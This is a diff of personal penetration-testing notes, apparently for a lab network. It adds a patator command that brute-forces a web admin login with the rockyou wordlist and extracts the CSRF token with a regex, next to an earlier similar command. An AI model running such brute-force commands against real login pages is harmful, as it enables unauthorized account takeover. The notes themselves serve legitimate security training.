@@ -253,6 +253,10 @@ If a CSRF is required, then `patator` works better:
 
 `patator http_fuzz method=POST --threads=1 timeout=5 url="http://10.11.1.11/scp/login.php" body="__CSRFToken__=_CSRF_&do=scplogin&userid=helpdesk&passwd=COMBO00&submit=Log+In" 0=/usr/share/wordlists/rockyou.txt before_urls="http://10.11.1.11/scp/login.php" before_egrep='_CSRF_:<input type="hidden" name="__CSRFToken__" value="(\w+)" />' -x ignore:fgrep='Access denied' proxy="http://127.0.0.1:8080" header="Cookie: OSTSESSID=s23pkfp9o9mo10kb8bea33ie76"`
 
+Another example, CSRF with `patator` (note sites like [pythex](https://pythex.org/) are good for getting the regex for csrf right - invalid regex results in NoneType has no attribute group etc errors):
+
+`patator http_fuzz method=POST --threads=1 timeout=5 url="http://10.11.2.245/index.php" body="__csrf_magic=_CSRF_&action=login&login_username=admin&login_password=COMBO00" 0=/usr/share/wordlists/rockyou.txt before_urls="http://10.11.2.245" before_egrep='_CSRF_:var csrfMagicToken = "([^\"]+)";' -x ignore:fgrep='Invalid' proxy="http://127.0.0.1:8080"`
+
 ## Downloading files with windows (or linux missing curl/wget)
 
 without the use of powershell or anything clever. great for pulling files off my attacker machine
